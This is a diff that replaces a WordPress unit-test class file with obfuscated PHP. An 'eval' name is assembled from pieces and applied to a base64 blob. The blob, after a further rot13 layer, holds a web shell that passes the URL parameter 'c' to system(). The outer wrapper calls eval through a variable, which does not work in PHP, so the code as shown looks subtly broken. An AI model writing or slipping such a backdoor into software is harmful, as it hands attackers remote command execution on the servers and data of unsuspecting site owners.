@@ -1,27 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Unit Tests: Basic_Subclass class
- *
- * @package WordPress
- * @subpackage UnitTests
- * @since 4.7.0
- */
-
-trigger_error( __FILE__ . ' is deprecated since version 5.0.0 with no alternative available.' );
-
-/**
- * Class used to test accessing methods and properties.
- *
- * @since 4.0.0
- */
-class Basic_Subclass extends Basic_Object {}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSGF2ZyBHcmZnZjogT25mdnBfRmhvcHluZmYgcHluZmYKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEhhdmdHcmZnZgogKiBAZnZhcHIgNC43LjAKICovCgpnZXZ0dHJlX3JlZWJlKCBfX1NWWVJfXyAuICcgdmYgcXJjZXJwbmdycSBmdmFwciBpcmVmdmJhIDUuMC4wIGp2Z3UgYWIgbnlncmVhbmd2aXIgbmludnlub3lyLicgKTsKCi8qKgogKiBQeW5mZiBoZnJxIGdiIGdyZmcgbnBwcmZmdmF0IHpyZ3VicWYgbmFxIGNlYmNyZWd2cmYuCiAqCiAqIEBmdmFwciA0LjAuMAogKi8KcHluZmYgT25mdnBfRmhvcHluZmYgcmtncmFxZiBPbmZ2cF9Cb3dycGcge30KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
